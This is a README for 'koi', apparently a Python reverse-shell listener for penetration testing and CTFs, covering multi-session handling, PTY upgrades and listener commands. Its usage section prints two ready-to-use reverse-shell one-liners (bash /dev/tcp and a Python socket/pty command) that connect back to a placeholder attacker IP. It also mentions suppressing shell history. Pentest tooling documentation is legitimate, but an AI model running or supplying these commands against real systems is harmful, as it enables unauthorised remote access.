# koi 🎏
[![Python Version](https://img.shields.io/badge/python-3.10%2B-blue.svg)](https://python.org)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

This project is my shot at making a fast, easy to use (yet feature rich) shell handler with a pretty interface.

Disclaimer: please note that this is still under development, and I tam still working on some of the key features, wich is talked about in [this section](#-wip).

---

### Demo

<img src="https://i.imgur.com/nUAtJf5.gif">

---

## ✨ Features

* **Multi-session**: Handles multiple reverse shells simultaneously list, switch, and background sessions without dropping any.
* **PTY Upgrade**: Upgrades a raw shell to a full PTY for proper tab completion, Ctrl+C forwarding, and terminal resizing.
* **Clean signals**: `Ctrl+Z` backgrounds the session, `Ctrl+C` sends `SIGINT` to the remote never kills your listener by accident.
* **Koi fish themed UI**: Gradient prompt, status indicators, and session boxes, pentest tooling doesn't have to be ugly.

## 🚧 WIP

* **Payloads**: A single command would allow you to generate generic payload in order to send them
* **Modules**: The big advantage of using python sockets to control your shells is the automation. I'm working on a module section that would automate inforamtion gathering, uploading of files such as bloodhound collectors
* **Testings**: I've tried my tool on CTF and personal devices but it still needs more testing, especially on windows based devices (do not hesitate on sending me bug reports)
---

## 🚀 Installation

```bash
# From source
git clone https://github.com/b3rt1ng/koi
cd koi
pipx install .

# directly from the repo
pipx install git+https://github.com/b3rt1ng/Koi

# For the lazy ones
pipx install koi-handler
```

---

## 💻 Usage

### Start the listener

```bash
# Default: bind 0.0.0.0:4444
koi

# Custom host/port
koi --host 10.10.14.5 --port 9001
koi -p 9001
```

### Catch a shell

Send a reverse shell from your target. Examples:

```bash
# bash
bash -i >& /dev/tcp/YOUR_IP/4444 0>&1

# Python PTY
python3 -c "import os,pty,socket;s=socket.socket();s.connect(('YOUR_IP',4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn('/bin/bash')"
```

---

## 🐚 Listener commands

Once `koi` is running, you are presented with a control terminal:

| Command | Description |
|---|---|
| `ls` | List all active sessions |
| `go <id>` | Enter a session interactively |
| `upgrade <id>` | Upgrade session to a full PTY |
| `kill <id>` | Terminate and remove a session |
| `help` | Show available commands |
| `exit` | Shut down the listener |

### Session signals

| Key | Action |
|---|---|
| `Ctrl+Z` | Background session → return to listener shell |
| `Ctrl+C` | Send `SIGINT` to the remote (keeps session alive) |

---

## 🔧 PTY Upgrade

Raw shells lack proper terminal support — no tab completion, broken `Ctrl+C`, mangled output. The `upgrade` command fixes this:

```
koi> upgrade 1
  Shell #1 upgraded successfully.
koi> go 1
  # now a full PTY with proper terminal behaviour
```

Under the hood it runs:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
with `TERM=xterm-256color` and history suppressed.
(and some resizing info)